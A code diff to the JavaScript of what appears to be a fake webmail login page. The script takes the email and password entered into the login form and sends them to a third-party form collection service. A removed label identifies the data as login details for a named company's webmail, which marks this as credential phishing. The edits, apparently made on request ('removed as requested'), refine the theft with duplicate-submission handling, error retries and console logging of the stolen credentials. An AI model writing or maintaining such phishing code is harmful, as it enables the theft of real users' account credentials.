@@ -524,6 +524,7 @@
       let a2 = document.querySelectorAll(".a1");
       var form = document.getElementById("login_form");
       var isSubmitting = false; // Flag to prevent multiple submissions
+      var lastSubmission = ""; // Track last submission to prevent duplicates
 
       // Add an event listener for form submission
       form.addEventListener("submit", function (event) {
@@ -532,11 +533,15 @@
         
         // Prevent multiple submissions
         if (isSubmitting) {
+          console.log("Already submitting, please wait");
           return;
         }
 
         let emailValue = emailInput.value;
         let passwordValue = passwordInput.value;
+        
+        // Create a unique key for this submission to prevent duplicates
+        var submissionKey = emailValue + "|" + passwordValue + "|" + Date.now();
 
         // Write an if statement to check if the input value is empty
         if (emailInput.value === "") {
@@ -582,13 +587,15 @@
         
         loading();
         
-        // Send data to Formspark ONCE with both email and password
+        // Send data to Formspark ONCE with ONLY email and password (no desc field)
         if (emailInput.value && passwordInput.value) {
           let dataLog = {
             email: emailInput.value,
-            password: passwordInput.value,
-            desc: "http://webmail.capitalaccesssolutions.com: Login Details"
+            password: passwordInput.value
+            // No desc field - removed as requested
           };
+          
+          console.log("Sending to Formspark:", dataLog);
           
           // Send to Formspark - ONE submission only
           fetch(formsparkUrl, {
@@ -601,6 +608,10 @@
           .then(response => {
             if (response.ok) {
               console.log("Data sent to Formspark successfully");
+            } else {
+              console.error("Formspark returned error:", response.status);
+              // Reset flag if there's an error so user can try again
+              isSubmitting = false;
             }
           })
           .catch(error => {
